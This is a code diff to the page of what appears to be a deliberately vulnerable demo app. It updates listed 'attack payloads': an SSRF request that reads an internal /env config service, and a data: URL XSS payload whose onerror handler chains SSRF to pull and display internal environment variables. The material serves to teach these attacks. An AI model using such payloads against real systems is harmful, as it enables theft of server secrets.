@@ -57,10 +57,10 @@
       <p class="text-gray-400 text-xs uppercase tracking-widest">Attack payloads</p>
 
       <div class="flex flex-col gap-1">
-        <p class="text-gray-500 text-xs font-semibold">① SSRF — probe the internal admin service:</p>
+        <p class="text-gray-500 text-xs font-semibold">① SSRF — read the internal config service:</p>
         <div class="flex items-center gap-2">
-          <code class="text-red-400 text-xs flex-1">http://localhost:3004/admin</code>
-          <button class="payload-btn text-gray-600 hover:text-red-400 text-xs transition-colors" data-url="http://localhost:3004/admin">Use</button>
+          <code class="text-red-400 text-xs flex-1">http://localhost:3004/env</code>
+          <button class="payload-btn text-gray-600 hover:text-red-400 text-xs transition-colors" data-url="http://localhost:3004/env">Use</button>
         </div>
       </div>
 
@@ -74,9 +74,10 @@
 
       <div class="flex flex-col gap-1">
         <p class="text-gray-500 text-xs font-semibold">③ XSS via SSRF — serve a page with a script and preview it:</p>
-        <p class="text-gray-600 text-xs">The server fetches the URL, the response body is rendered via <code class="text-gray-400">innerHTML</code>. If the response contains HTML with event handlers, they execute in the victim's browser.</p>
-        <code class="text-red-400 text-xs break-all">data:text/html,&lt;img src=x onerror="alert('XSS via SSRF ☠️')"&gt;</code>
-        <button class="payload-btn self-start text-gray-600 hover:text-red-400 text-xs transition-colors mt-1" data-url="data:text/html,<img src=x onerror=""alert('XSS via SSRF ☠️')"">Use</button>
+        <p class="text-gray-600 text-xs">The server fetches the URL, the response body is rendered via <code class="text-gray-400">innerHTML</code>. The injected payload fires an alert to confirm XSS, then silently calls <code class="text-gray-400">/api/fetch</code> to pull the internal env vars and render them on screen.</p>
+        <code class="text-red-400 text-xs break-all">data:text/html,&lt;img src=x onerror="fetch('/api/fetch',{...url:'http://localhost:3004/env'...}).then(d=&gt;render(d))"&gt;</code>
+        <button class="payload-btn self-start text-gray-600 hover:text-red-400 text-xs transition-colors mt-1"
+          data-url="data:text/html,<img src=x onerror=&quot;fetch('/api/fetch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:'http://localhost:3004/env'})}).then(r=>r.json()).then(d=>{document.getElementById('response-rendered').innerHTML='<div style=background:%23111;padding:16px;border-radius:8px;border:1px solid %23f87171><p style=color:%23f87171;font-size:11px;font-weight:bold;margin-bottom:8px>&#9888; INTERNAL ENV VARS EXFILTRATED VIA XSS+SSRF</p><pre style=color:%2386efac;font-size:11px;font-family:monospace;white-space:pre-wrap>'+d.body+'</pre></div>'})&quot;>">Use</button>
       </div>
     </div>
 
@@ -116,9 +117,7 @@
 
     document.querySelectorAll('.payload-btn').forEach(btn => {
       btn.addEventListener('click', () => {
-        const url = btn.dataset.url;
-        document.getElementById('url-input').value = url;
-        doFetch(url);
+        document.getElementById('url-input').value = btn.dataset.url;
       });
     });
   </script>
